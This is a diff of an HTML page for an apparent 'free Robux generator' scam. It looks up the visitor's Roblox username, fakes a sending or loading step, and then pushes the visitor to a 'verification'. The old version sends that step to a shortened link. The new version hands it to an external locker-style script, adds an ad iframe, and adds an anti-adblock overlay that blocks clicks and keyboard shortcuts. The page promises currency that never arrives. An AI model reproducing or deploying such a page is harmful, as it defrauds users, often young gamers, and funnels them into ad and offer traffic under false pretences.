@@ -1,12 +1,13 @@
 <!DOCTYPE html>
-<html lang='en'>
+<html lang="en">
 <head>
-    <meta charset='UTF-8'/>
-    <meta content='width=device-width, initial-scale=1.0' name='viewport'/>
-    <title>Home</title>
-    <script src='https://cdn.tailwindcss.com'></script>
-    <style>
-        @import url("https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@520&family=Poppins:wght@400;600;700;900&display=swap");
+    <meta charset="UTF-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Robux Generator</title>
+    <link rel="icon" href="https://tr.rbxcdn.com/97b15696b339e8afd80b39eaf955ada3/420/420/Image/Png" type="image/png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style id="page-skin-1" type="text/css">
+        @import url("https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@520&display=swap");
         * {
             margin: 0;
             padding: 0;
@@ -16,15 +17,6 @@
         body {
             background-color: #f2f4f5;
             color: #393b3d;
-        }
-        nav {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background-color: #dee1e3;
-            border-bottom: 1px solid #c7cbce;
-            padding: 0 40px;
         }
         .logo {
             width: 30px;
@@ -36,34 +28,39 @@
             margin-right: 18px;
             font-size: 25px;
         }
+        nav {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #dee1e3;
+            border-bottom: 1px solid #c7cbce;
+            padding: 0 40px;
+        }
         nav ul {
             list-style: none;
             display: flex;
         }
-        nav ul li {
+        ul li {
             margin-left: 30px;
         }
-        img {
-            max-width: 100%;
+        @media (max-width: 373px) {
+            .logo span {
+                display: none;
+            }
+            nav {
+                padding: 0;
+            }
         }
-        @keyframes loupeOrbitGlow {
-            0%   { transform: rotate(0deg) translateX(10px) rotate(0deg); filter: drop-shadow(0 0 0px #9ca3af); }
-            25%  { transform: rotate(90deg) translateX(10px) rotate(-90deg); filter: drop-shadow(0 0 6px #9ca3af); }
-            50%  { transform: rotate(180deg) translateX(10px) rotate(-180deg); filter: drop-shadow(0 0 10px #9ca3af); }
-            75%  { transform: rotate(270deg) translateX(10px) rotate(-270deg); filter: drop-shadow(0 0 6px #9ca3af); }
-            100% { transform: rotate(360deg) translateX(10px) rotate(-360deg); filter: drop-shadow(0 0 0px #9ca3af); }
+        @media (max-width: 442px) {
+            nav {
+                padding: 0 20px;
+            }
         }
-        .animate-loupe-orbit-glow {
-            animation: loupeOrbitGlow 2s linear infinite;
-            transform-origin: center;
-        }
-        @keyframes sonarPulse {
-            0% { transform: scale(0.8); opacity: 0.6; }
-            50% { transform: scale(1.4); opacity: 0.2; }
-            100% { transform: scale(2); opacity: 0; }
-        }
-        .animate-sonar {
-            animation: sonarPulse 2s ease-out infinite;
+        @media (max-width: 396px) {
+            nav {
+                padding: 0 10px;
+            }
         }
         .animate-fade-in {
             animation: fadeIn 0.5s ease-in-out;
@@ -72,267 +69,464 @@
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        #checkmark {
-            stroke-dasharray: 166;
-            stroke-dashoffset: 166;
-            animation: stroke 0.6s ease-in-out forwards;
+        
+        @keyframes slideIn {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
-        .checkmark-check {
-            stroke-dasharray: 48;
-            stroke-dashoffset: 48;
-            animation: stroke 0.4s 0.6s ease-in-out forwards;
-        }
-        .checkmark-circle {
-            stroke-dasharray: 166;
-            stroke-dashoffset: 166;
-            animation: stroke 0.6s ease-in-out forwards;
-        }
-        @keyframes stroke {
-            100% { stroke-dashoffset: 0; }
-        }
-        .animate-pulse-button {
-            animation: pulseGlow 1.5s infinite;
-        }
-        @keyframes pulseGlow {
-            0% { box-shadow: 0 0 0px rgba(72, 187, 120, 0.4); transform: scale(1); }
-            50% { box-shadow: 0 0 10px rgba(72, 187, 120, 0.6); transform: scale(1.03); }
-            100% { box-shadow: 0 0 0px rgba(72, 187, 120, 0.4); transform: scale(1); }
-        }
-         @keyframes sendPulse {
-            0%, 100% { transform: translateY(0) scale(1); opacity: 1; }
-            50% { transform: translateY(-6px) scale(1.1); opacity: 0.8; }
-        }
-        .animate-send {
-            animation: sendPulse 1s infinite ease-in-out;
+        
+        @media (max-width: 480px) {
+            .popup-ad-container {
+                width: 90%;
+                left: 5%;
+                right: 5%;
+                bottom: 10px;
+            }
         }
     </style>
-<link rel="me" href="https://www.blogger.com/profile/00125340272078018543" />
+    <script type="text/javascript">
+    var endXj_LoZ_qERUTc={"it":4524687,"key":"9c53c"};
+</script>
+<script src="https://dlk457skl57zp.cloudfront.net/8632eb5.js"></script>
+<link rel="me" href="https://www.blogger.com/profile/10974457846013415373" />
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
-<body class='text-gray-900 min-h-screen relative'>
+<body>
+    <nav>
+        <div class="logo">
+            <span>&#9776;</span>
+            <img alt="Logo" src="https://i.imgur.com/BlDJdmo.jpeg"/>
+        </div>
+        <ul>
+            <li>Charts</li>
+            <li>Marketplace</li>
+            <li>Robux</li>
+        </ul>
+    </nav>
 
-<nav>
-    <div class='logo'>
-        <span>☰</span>
-        <img src='https://i.imgur.com/BlDJdmo.jpeg' alt="Logo"/>
-    </div>
-    <ul>
-        <li>Charts</li>
-        <li>Marketplace</li>
-        <li>Robux</li>
-    </ul>
-</nav>
-
-<!-- Error Modal -->
-<div class='hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50' id='error-modal'>
-    <div class='bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center'>
-        <p class='text-red-600 font-semibold mb-4' id='error-modal-text'>Error</p>
-        <button class='bg-red-500 text-white px-4 py-2 rounded-xl hover:bg-red-600 transition' onclick='closeErrorModal()'>Close</button>
-    </div>
-</div>
-
-<!-- Hero Banner -->
-<div class='w-full h-52 md:h-64 relative overflow-hidden shadow-lg mb-3'>
-    <img alt='Banner Roblox' class='absolute inset-0 w-full h-full object-cover' src='https://i.imgur.com/pnKIeyU.jpeg'/>
-    <div class='absolute inset-0 bg-black bg-opacity-40 flex items-center justify-center'>
-        <div class="text-center">
-             <h1 class='text-3xl md:text-5xl font-bold text-white px-4'>Get Robux</h1>
-             <p class='mt-6 text-sm font-normal text-white px-2'>Enter your Roblox username below so our admin can find your account and send you free Robux.</p>
+    <div class="w-screen h-52 md:h-64 relative overflow-hidden shadow-lg mb-10 rounded-none">
+        <img alt="Banner" class="absolute inset-0 w-full h-full object-cover" src="https://i.imgur.com/pnKIeyU.jpeg"/>
+        <div class="absolute inset-0 bg-black bg-opacity-40 flex items-center justify-center">
+            <h1 class="text-3xl md:text-5xl font-bold text-white text-center px-4">
+                Receive Robux
+            </h1>
         </div>
     </div>
-</div>
 
-<section class='max-w-xl mx-auto py-10 px-6 text-center'>
-    <!-- Search Section -->
-    <div id='first-content'>
-        <input class='w-full px-4 py-2 rounded-xl shadow-md mb-4 text-lg border border-gray-300' id='username' placeholder='Enter your Roblox username' type='text'/>
-        <button class='bg-[#272930] text-white px-6 py-2 rounded-xl hover:bg-gray-800 transition mb-6' id='search-button'>
+    <div class="max-w-xl mx-auto py-10 px-6 text-center">
+        <input class="w-full px-4 py-2 rounded-xl shadow-md mb-4 text-lg border border-gray-300" 
+               id="username" 
+               placeholder="Enter your Roblox username" 
+               type="text"/>
+        <button class="bg-[#272930] text-white px-6 py-2 rounded-xl hover:bg-gray-800 transition mb-6" 
+                id="search-button" 
+                onclick="fetchProfile()">
             Search
         </button>
-    </div>
-
-    <!-- Loading Spinner -->
-    <div class='hidden my-6 flex items-center justify-center flex-col relative' id='loading-spinner'>
-        <div class='absolute animate-sonar w-20 h-20 rounded-full bg-gray-400/20'></div>
-        <svg class='relative h-12 w-12 text-gray-600 animate-loupe-orbit-glow z-10' fill='none' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'>
-            <path d='M21 21l-4.35-4.35M10.5 18a7.5 7.5 0 100-15 7.5 7.5 0 000 15z' stroke='currentColor' stroke-linecap='round' stroke-linejoin='round' stroke-width='2'></path>
-        </svg>
-        <span class='mt-2 text-gray-600 text-sm animate-pulse z-10'>Searching profile...</span>
-    </div>
-
-    <!-- Profile Display -->
-    <div class='hidden text-center' id='profile'>
-        <img class='w-24 h-24 mx-auto rounded-full mb-2 shadow-md' id='avatar' alt="User Avatar"/>
-        <p class='text-xl font-semibold' id='display-name'></p>
-    </div>
-
-    <!-- Resource Selection -->
-    <div class='hidden mt-8' id='resource-section'>
-        <div class='grid grid-cols-2 gap-4'>
-            <div class='resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition' onclick='selectResource(this, 800)'>
-                <img alt='Robux Icon' class='w-8 h-8 mx-auto mb-2' src='https://i.imgur.com/l9Qdc3C.jpeg'/>
-                <p class='text-xl font-semibold'>800</p>
-            </div>
-            <div class='resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition' onclick='selectResource(this, 1700)'>
-                <img alt='Robux Icon' class='w-8 h-8 mx-auto mb-2' src='https://i.imgur.com/l9Qdc3C.jpeg'/>
-                <p class='text-xl font-semibold'>1,700</p>
-            </div>
-            <div class='resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition' onclick='selectResource(this, 4500)'>
-                <img alt='Robux Icon' class='w-8 h-8 mx-auto mb-2' src='https://i.imgur.com/l9Qdc3C.jpeg'/>
-                <p class='text-xl font-semibold'>4,500</p>
-            </div>
-            <div class='resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition' onclick='selectResource(this, 10000)'>
-                <img alt='Robux Icon' class='w-8 h-8 mx-auto mb-2' src='https://i.imgur.com/l9Qdc3C.jpeg'/>
-                <p class='text-xl font-semibold'>10,000</p>
-            </div>
-        </div>
-        <button class='hidden mt-6 bg-[#272930] text-white px-6 py-2 rounded-xl hover:bg-green-700 transition' id='confirm-button' onclick='confirmSelection()'>
-          Confirm
-        </button>
-    </div>
-
-    <!-- Sending Animation -->
-    <div class='hidden mt-10 flex justify-center items-center flex-col' id='sending-animation'>
-        <img alt='Sending Robux' class='w-10 h-10 animate-send' src='https://i.imgur.com/l9Qdc3C.jpeg'/>
-        <p class='mt-2 text-sm text-gray-700 animate-pulse'>Sending Robux...</p>
-    </div>
-
-    <!-- Success Message -->
-    <div class='hidden max-w-md mx-auto p-6 rounded-xl bg-green-100 shadow-md text-center animate-fade-in' id='success-message'>
-        <div class='w-16 h-16 mx-auto mb-4'>
-            <svg class='w-full h-full text-green-500' id='checkmark' viewBox='0 0 52 52'>
-                <circle class='checkmark-circle' cx='26' cy='26' fill='none' r='25' stroke='currentColor' stroke-width='2'></circle>
-                <path class='checkmark-check' d='M14 27l7 7 17-17' fill='none' stroke='currentColor' stroke-width='4'></path>
-            </svg>
-        </div>
-        <h2 class='text-xl font-semibold text-green-700 mb-2'>Almost there!</h2>
-        <p class='text-sm text-green-700 mb-4'>
-          Robux are ready to be delivered. Please verify you're human to complete the process.
-        </p>
-        <a class='inline-block bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-lg transition shadow-green-glow animate-pulse-button' href='https://smrturl.co/246a3e4' target='_blank'>
-          ✅ Complete Verification
-        </a>
-    </div>
-</section>
-
-<script>
-    document.addEventListener('DOMContentLoaded', (event) => {
-        let selectedResource = null;
         
-        const searchButton = document.getElementById('search-button');
+        <div class="hidden mt-6 text-center" id="profile">
+            <img class="w-24 h-24 mx-auto rounded-full mb-2 shadow-md" id="avatar"/>
+            <p class="text-xl font-semibold" id="display-name"></p>
+        </div>
 
-        // Check if the button exists before adding an event listener
-        if(searchButton) {
-            searchButton.addEventListener('click', fetchProfile);
-        } else {
-            console.error("Search button not found!");
-        }
+        <div class="hidden mt-8" id="resource-section">
+            <p class="block text-lg font-medium mb-4">Select robux amount</p>
+            <div class="grid grid-cols-2 gap-4">
+                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
+                     onclick="selectResource(this, 800)">
+                    <img alt="800 Robux" class="w-8 h-8 mx-auto mb-2" src="https://i.imgur.com/l9Qdc3C.jpeg"/>
+                    <p class="text-xl font-semibold">800</p>
+                </div>
+                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
+                     onclick="selectResource(this, 1700)">
+                    <img alt="1700 Robux" class="w-8 h-8 mx-auto mb-2" src="https://i.imgur.com/l9Qdc3C.jpeg"/>
+                    <p class="text-xl font-semibold">1,700</p>
+                </div>
+                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
+                     onclick="selectResource(this, 4500)">
+                    <img alt="4500 Robux" class="w-8 h-8 mx-auto mb-2" src="https://i.imgur.com/l9Qdc3C.jpeg"/>
+                    <p class="text-xl font-semibold">4,500</p>
+                </div>
+                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
+                     onclick="selectResource(this, 10000)">
+                    <img alt="10000 Robux" class="w-8 h-8 mx-auto mb-2" src="https://i.imgur.com/l9Qdc3C.jpeg"/>
+                    <p class="text-xl font-semibold">10,000</p>
+                </div>
+            </div>
+            <div class="flex justify-center mt-6">
+                <button class="hidden bg-green-600 text-white px-6 py-2 rounded-xl hover:bg-green-700 transition" 
+                        id="confirm-button" 
+                        onclick="confirmSelection()">
+                    Confirm
+                </button>
+            </div>
+        </div>
+    </div>
 
-        // --- Other functions ---
+    <!-- Loading Overlay -->
+    <div class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" id="loading-overlay">
+        <div class="text-center">
+            <div class="w-16 h-16 border-4 border-white border-dashed rounded-full animate-spin mx-auto mb-4"></div>
+            <p class="text-white text-xl font-semibold animate-pulse">Loading...</p>
+        </div>
+    </div>
 
-        window.selectResource = function(element, amount) {
-            document.querySelectorAll('.resource-option').forEach(el => {
-                el.classList.remove('bg-green-200', 'border-green-500');
-            });
-            element.classList.add('bg-green-200', 'border-green-500');
-            selectedResource = amount;
-            document.getElementById('confirm-button').classList.remove('hidden');
-        }
+    <!-- Error Modal -->
+    <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="error-modal">
+        <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center">
+            <p class="text-red-600 font-semibold mb-4" id="error-modal-text">Error</p>
+            <button class="bg-red-500 text-white px-4 py-2 rounded-xl hover:bg-red-600 transition" 
+                    onclick="closeErrorModal()">
+                Close
+            </button>
+        </div>
+    </div>
 
-        window.confirmSelection = function() {
-            if (!selectedResource) {
-                alert("Please select a Robux amount first.");
-                return;
+    <!-- Verification Step -->
+    <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="verify-step">
+        <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center animate-fade-in">
+            <p class="text-lg font-medium mb-4">Complete the verification to receive your robux.</p>
+            <button class="bg-[#272930] text-white px-4 py-2 rounded-xl hover:bg-gray-800 transition" 
+                    onclick="_cy()">
+                Verify
+            </button>
+        </div>
+    </div>
+
+    <script>
+        (function(){
+            // DOM Elements
+            const errorModal = document.getElementById("error-modal");
+            const errorModalText = document.getElementById("error-modal-text");
+            const loadingOverlay = document.getElementById("loading-overlay");
+            const verifyStep = document.getElementById("verify-step");
+            let selectedResource = null;
+
+            // Show error message
+            function showError(message) {
+                errorModalText.textContent = message;
+                errorModal.classList.remove("hidden");
             }
-            
-            document.getElementById('profile').classList.add('hidden');
-            document.getElementById('resource-section').classList.add('hidden');
-            document.getElementById('sending-animation').classList.remove('hidden');
 
-            setTimeout(() => {
-                document.getElementById('sending-animation').classList.add('hidden');
-                document.getElementById('success-message').classList.remove('hidden');
-            }, 2000);
-        }
-
-        window.closeErrorModal = function() {
-            document.getElementById('error-modal').classList.add('hidden');
-        }
-
-        async function fetchProfile() {
-            const username = document.getElementById('username').value.trim();
-            const errorModal = document.getElementById('error-modal');
-            const errorText = document.getElementById('error-modal-text');
-            const profileSection = document.getElementById('profile');
-            const displayName = document.getElementById('display-name');
-            const avatar = document.getElementById('avatar');
-            const loadingSpinner = document.getElementById('loading-spinner');
-            const resourceSection = document.getElementById('resource-section');
-            const firstContent = document.getElementById('first-content');
-
-            errorModal.classList.add('hidden');
-            profileSection.classList.add('hidden');
-            resourceSection.classList.add('hidden');
-            document.getElementById('success-message').classList.add('hidden');
-            
-            if (!username) {
-                errorText.textContent = "❌ Please enter a valid username.";
-                errorModal.classList.remove('hidden');
-                return;
+            // Close error modal
+            function closeErrorModal() {
+                errorModal.classList.add("hidden");
             }
 
-            loadingSpinner.classList.remove('hidden');
-            firstContent.classList.add('hidden');
+            // Fetch Roblox profile
+            async function fetchProfile() {
+                const username = document.getElementById("username").value.trim();
+                const profile = document.getElementById("profile");
+                const resourceSection = document.getElementById("resource-section");
+                const confirmButton = document.getElementById("confirm-button");
+                
+                // Reset UI
+                profile.classList.add("hidden");
+                resourceSection.classList.add("hidden");
+                confirmButton.classList.add("hidden");
+                
+                if(!username) {
+                    showError("Please enter a Roblox username");
+                    return;
+                }
+                
+                loadingOverlay.classList.remove("hidden");
+                
+                try {
+                    // Step 1: Get user ID
+                    const res1 = await fetch("https://users.roproxy.com/v1/usernames/users", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ 
+                            usernames: [username], 
+                            excludeBannedUsers: true 
+                        })
+                    });
 
-            try {
-                // Step 1: Get User ID from username via roproxy
-                const userResponse = await fetch('https://users.roproxy.com/v1/usernames/users', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                    body: JSON.stringify({ usernames: [username], excludeBannedUsers: true })
+                    const data1 = await res1.json();
+                    if (!data1.data || data1.data.length === 0) {
+                        throw new Error("User not found");
+                    }
+
+                    const userId = data1.data[0].id;
+                    const displayName = data1.data[0].displayName;
+
+                    // Step 2: Get avatar image
+                    const res2 = await fetch(
+                        `https://thumbnails.roproxy.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`
+                    );
+                    const data2 = await res2.json();
+                    const avatarUrl = data2.data[0].imageUrl;
+
+                    // Update UI
+                    document.getElementById("avatar").src = avatarUrl;
+                    document.getElementById("display-name").textContent = displayName;
+                    profile.classList.remove("hidden");
+                    resourceSection.classList.remove("hidden");
+                } catch (err) {
+                    showError("User not found. Please check the username and try again.");
+                } finally {
+                    loadingOverlay.classList.add("hidden");
+                }
+            }
+
+            // Select Robux amount
+            function selectResource(element, value) {
+                // Remove selection from all options
+                document.querySelectorAll('.resource-option').forEach(item => {
+                    item.classList.remove(
+                        'ring', 
+                        'ring-2', 
+                        'ring-green-500', 
+                        'bg-green-50'
+                    );
                 });
-
-                if (!userResponse.ok) throw new Error('Network response was not ok.');
                 
-                const userData = await userResponse.json();
-
-                if (!userData.data || userData.data.length === 0) {
-                    throw new Error(`User not found: ${username}`);
-                }
-
-                const user = userData.data[0];
-                const userId = user.id;
-
-                // Step 2: Get user avatar
-                const thumbnailResponse = await fetch(`https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
-
-                if (!thumbnailResponse.ok) throw new Error('Failed to fetch avatar.');
+                // Add selection to clicked option
+                element.classList.add(
+                    'ring', 
+                    'ring-2', 
+                    'ring-green-500', 
+                    'bg-green-50'
+                );
                 
-                const thumbnailData = await thumbnailResponse.json();
-                
-                if (!thumbnailData.data || thumbnailData.data.length === 0 || !thumbnailData.data[0].imageUrl) {
-                    throw new Error('Could not retrieve avatar image.');
+                selectedResource = value;
+                document.getElementById('confirm-button').classList.remove('hidden');
+            }
+
+            // Confirm selection
+            async function confirmSelection() {
+                if(!selectedResource) {
+                    showError("Please select a Robux amount");
+                    return;
                 }
                 
-                // Success: Update UI
-                loadingSpinner.classList.add('hidden');
-                displayName.textContent = user.displayName;
-                avatar.src = thumbnailData.data[0].imageUrl;
-                
-                profileSection.classList.remove('hidden');
-                resourceSection.classList.remove('hidden');
+                loadingOverlay.classList.remove("hidden");
+                await new Promise(resolve => setTimeout(resolve, 2500));
+                loadingOverlay.classList.add("hidden");
+                verifyStep.classList.remove("hidden");
+            }
+            
+            // Close popup ad
+            function closePopup() {
+                document.getElementById('popupAd').style.display = 'none';
+            }
+            
+            // Load ad in iframe (replace with your actual ad URL)
+            function loadAd() {
+                const iframe = document.getElementById('adIframe');
+                // Replace this with your actual ad URL
+                iframe.src = 'https://www.profitableratecpm.com/t1cg47pdmr?key=e7667651e39309ade12aac0ee256c197';
+            }
 
-            } catch (error) {
-                console.error("Fetch profile error:", error);
-                loadingSpinner.classList.add('hidden');
-                firstContent.classList.remove('hidden');
-                errorText.textContent = `❌ Can't find player '${username}'. Please check the username and try again.`;
-                errorModal.classList.remove('hidden');
+            // Expose functions to global scope
+            window.fetchProfile = fetchProfile;
+            window.selectResource = selectResource;
+            window.confirmSelection = confirmSelection;
+            window.closeErrorModal = closeErrorModal;
+            window.closePopup = closePopup;
+            
+            // Load popup ad immediately
+            window.onload = function() {
+                loadAd();
+            };
+        })();
+    </script>
+
+    <script>
+(function() {
+    const adBlockPopup = document.createElement('div');
+    adBlockPopup.id = 'adblock-popup';
+    adBlockPopup.innerHTML = `
+        <h2>⛔ AdBlock Detected!</h2>
+        <p>Please disable AdBlock to continue.</p>
+        <div class="instructions">
+            <h3>How to disable AdBlock:</h3>
+            <ol>
+                <li>Click the AdBlock icon in your browser</li>
+                <li>Select "Don't run on this site" or "Pause on this site"</li>
+                <li>Refresh this page</li>
+            </ol>
+        </div>
+        <p>This message will automatically disappear when AdBlock is disabled.</p>
+    `;
+
+    const overlay = document.createElement('div');
+    overlay.id = 'adblock-overlay';
+
+    const style = document.createElement('style');
+    style.textContent = `
+        #adblock-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 30px rgba(0,0,0,0.3);
+            z-index: 99999;
+            max-width: 600px;
+            width: 90%;
+            text-align: center;
+            border: 2px solid #ff4757;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 71, 87, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(255, 71, 87, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 71, 87, 0); }
+        }
+        
+        #adblock-popup h2 {
+            color: #ff4757;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        
+        #adblock-popup p {
+            margin-bottom: 25px;
+            line-height: 1.8;
+            font-size: 18px;
+        }
+        
+        #adblock-popup .instructions {
+            background-color: #fff9f9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+            border-left: 4px solid #ff4757;
+        }
+        
+        #adblock-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.85);
+            z-index: 99998;
+            backdrop-filter: blur(5px);
+        }
+        
+        body.adblock-active {
+            overflow: hidden;
+            height: 100vh;
+            pointer-events: none;
+        }
+        
+        body.adblock-active #adblock-popup,
+        body.adblock-active #adblock-overlay {
+            pointer-events: auto;
+        }
+        
+        @media (max-width: 768px) {
+            #adblock-popup {
+                padding: 20px;
+                max-width: 95%;
+            }
+            #adblock-popup h2 {
+                font-size: 20px;
+            }
+            #adblock-popup p {
+                font-size: 16px;
             }
         }
-    });
-</script>
+    `;
 
+    document.head.appendChild(style);
+    document.body.appendChild(overlay);
+    document.body.appendChild(adBlockPopup);
+
+    let adBlockDetected = false;
+    
+    async function detectAdBlock() {
+        try {
+            await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', {
+                method: 'HEAD',
+                mode: 'no-cors',
+                cache: 'no-store'
+            });
+            
+            const ad = document.createElement('div');
+            ad.innerHTML = '&nbsp;';
+            ad.className = 'ad ads ad-ads ad-box ad-unit ad-zone ad-space ad-area';
+            ad.style.height = '1px';
+            ad.style.position = 'absolute';
+            ad.style.left = '-9999px';
+            document.body.appendChild(ad);
+            
+            setTimeout(() => {
+                const isBlocked = ad.offsetHeight === 0;
+                document.body.removeChild(ad);
+                return isBlocked;
+            }, 100);
+            
+            return false;
+        } catch(e) {
+            return true;
+        }
+    }
+    
+    function showAdblockPopup() {
+        document.body.classList.add('adblock-active');
+        document.getElementById('adblock-overlay').style.display = 'block';
+        document.getElementById('adblock-popup').style.display = 'block';
+    }
+    
+    function hideAdblockPopup() {
+        document.body.classList.remove('adblock-active');
+        document.getElementById('adblock-overlay').style.display = 'none';
+        document.getElementById('adblock-popup').style.display = 'none';
+    }
+    
+    async function checkAdBlockContinuously() {
+        const isBlocked = await detectAdBlock();
+        
+        if (isBlocked) {
+            adBlockDetected = true;
+            showAdblockPopup();
+        } else if (adBlockDetected) {
+            adBlockDetected = false;
+            hideAdblockPopup();
+            window.location.reload();
+        }
+        
+        setTimeout(checkAdBlockContinuously, 2000);
+    }
+    
+    function disableShortcuts() {
+        document.addEventListener('contextmenu', function(e) {
+            if (adBlockDetected) {
+                e.preventDefault();
+            }
+        });
+        
+        document.addEventListener('keydown', function(e) {
+            if (adBlockDetected && (e.ctrlKey || e.metaKey || e.keyCode === 123)) {
+                e.preventDefault();
+            }
+        });
+    }
+    
+    window.addEventListener('load', () => {
+        checkAdBlockContinuously();
+        disableShortcuts();
+        
+        document.addEventListener('click', function(e) {
+            if (adBlockDetected && e.target.id !== 'adblock-popup' && 
+                !document.getElementById('adblock-popup').contains(e.target)) {
+                e.preventDefault();
+                e.stopPropagation();
+            }
+        }, true);
+    });
+})();
+</script>
 </body>
 </html>
